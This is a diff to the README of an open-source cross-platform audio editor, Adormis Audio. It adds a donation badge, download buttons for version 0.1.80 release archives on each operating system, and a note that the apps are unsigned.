@@ -1,8 +1,20 @@
 # Adormis Audio
 
-A destructive audio editor in the spirit of classic Sound Forge: the same menu
-layout and default keyboard shortcuts, running natively on **macOS** (Apple
-Silicon and Intel), **Linux** and **Windows**, with VST3 plug-in support planned.
+[![Buy me a coffee](https://img.shields.io/badge/Buy_me_a_coffee-fbbf24?style=for-the-badge&logo=paypal&logoColor=1e1b2e)](https://www.paypal.biz/PetreUrda)
+
+## Download version 0.1.80
+
+[![Download for Windows](https://img.shields.io/badge/Windows-2563eb?style=for-the-badge&logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDMuNCA5LjggMnY5LjVIMHpNMTEgMS45IDI0IDB2MTEuNUgxMXpNMCAxMi41aDkuOFYyMkwwIDIwLjZ6TTExIDEyLjVoMTNWMjRsLTEzLTEuOXoiLz48L3N2Zz4%3D)](https://github.com/jastincheis/adormis-audio/releases/download/v0.1.80/AdormisAudio-0.1.80-Windows.zip)
+[![Download for macOS](https://img.shields.io/badge/macOS-111827?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/jastincheis/adormis-audio/releases/download/v0.1.80/AdormisAudio-0.1.80-macOS.zip)
+[![Download for Linux x86_64](https://img.shields.io/badge/Linux_x86__64-d97706?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/jastincheis/adormis-audio/releases/download/v0.1.80/AdormisAudio-0.1.80-Linux-x86_64.tar.gz)
+[![Download for Linux ARM64](https://img.shields.io/badge/Linux_ARM64-d97706?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/jastincheis/adormis-audio/releases/download/v0.1.80/AdormisAudio-0.1.80-Linux-arm64.tar.gz)
+
+Preview version, free and open source. The apps are not signed yet, so your system asks you to confirm the first time: see [Install](#install).
+
+## About
+
+A destructive audio editor running natively on **macOS** (Apple Silicon and Intel),
+**Linux** and **Windows**, with VST3 plug-in support planned.
 
 Adormis Audio (formerly WaveForge) is an independent project. It is not affiliated with, endorsed by or
 derived from Sound Forge or its owners; it only follows the publicly documented
@@ -81,8 +93,8 @@ On macOS, `Ctrl` shortcuts use `Cmd` and `Alt` uses `Option`.
 
 ## Install
 
-Download the file for your system from the
-[latest release](https://github.com/jastincheis/adormis-audio/releases).
+Use the download buttons at the top of this page, or pick a file from
+[all releases](https://github.com/jastincheis/adormis-audio/releases).
 The apps are not signed yet, so each system asks you to confirm the first time.
 
 ### macOS (11 Big Sur or newer, Apple Silicon and Intel)
